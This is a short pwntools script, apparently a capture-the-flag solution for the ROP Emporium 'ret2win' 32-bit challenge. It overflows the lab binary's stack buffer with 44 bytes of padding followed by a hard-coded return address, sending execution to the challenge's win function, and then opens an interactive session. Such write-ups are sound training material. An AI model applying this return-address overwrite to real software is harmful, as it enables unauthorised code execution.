#link: https://ropemporium.com/challenge/ret2win.html
from pwn import *

bin = process('./ret2win32')

fill = b"A"*44
addr = b"\x2c\x86\x04\x08"
combine = fill + addr

bin.send(combine)
bin.interactive()
print(bin.recvline())
